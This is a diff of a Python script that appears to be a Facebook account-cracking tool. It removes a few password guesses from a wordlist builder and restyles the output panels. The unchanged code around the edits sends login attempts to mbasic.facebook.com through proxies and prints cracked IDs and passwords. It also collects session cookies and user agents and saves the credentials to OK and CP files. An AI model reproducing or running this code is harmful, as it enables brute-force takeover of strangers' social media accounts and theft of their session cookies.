@@ -1644,9 +1644,6 @@ def passwrd():
 						pwv.append(frs+'03')
 						pwv.append(frs+'04')
 						pwv.append(frs+'05')
-						pwv.append(frs+'06')
-						pwv.append(frs+'07')
-						pwv.append(frs+'08')
 						pwv.append(frs+'09')
 						pwv.append(frs+'12')
 						pwv.append(frs+'321')
@@ -1656,10 +1653,6 @@ def passwrd():
 						pwv.append(frs+'1234')
 						pwv.append(frs+'12345')
 						pwv.append(frs+'123456')
-						pwv.append(frs+'sayang')
-						pwv.append(frs+'cantik')
-						pwv.append('memek')
-						pwv.append('sayang')
 				if 'ya' in pwpluss: 
 					for xpwd in pwnya:
 						pwv.append(xpwd)
@@ -1829,8 +1822,8 @@ def crackmbasic(idf,pwv):
 
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				cetak(panel(f"[bold yellow]{idf} ◊ {pw}",width=35,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				cetak(panel(f"╰─[bold yellow]{idf} ◊ {pw}",width=35,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"|──[bold yellow]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1839,9 +1832,9 @@ def crackmbasic(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(panel(f"[bold green]{idf} ◊ {pw}",width=35,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
-				cetak(panel(f"[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
+				cetak(panel(f"╰─[bold green]{idf} ◊ {pw}",width=35,title=f"[bold red][[bold white] ID & PW [bold red]]",style=f"bold red"))
+				cetak(panel(f"|──[bold green]{kuki}",width=90,title=f"[bold red][[bold white] Cookies [bold red]]",style=f"bold red"))
+				cetak(panel(f"|──[bold green]{ua}",width=90,title=f"[bold red][[bold white] User-Agent [bold red]]",style=f"bold red"))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kuki)
 				break
